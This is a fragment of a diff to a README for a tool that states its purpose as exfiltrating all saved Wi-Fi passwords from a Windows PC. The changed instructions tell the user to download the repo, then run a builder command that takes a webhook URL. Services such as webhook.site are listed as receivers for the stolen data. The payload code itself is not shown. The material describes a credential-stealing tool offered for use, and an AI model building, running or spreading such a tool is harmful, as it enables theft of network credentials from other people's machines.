@@ -13,9 +13,10 @@ Exfiltrate all saved Wi-Fi passwords from a Windows PC.
 - https://beeceptor.com
 - https://webhook.site
 
-## Instructions
+## Instructions (Windows Only)
+1. Download repo as ZIP
 
-Run builder
+2. Run builder
 ```bash
 python3 build.py <webhook_url>
 ```
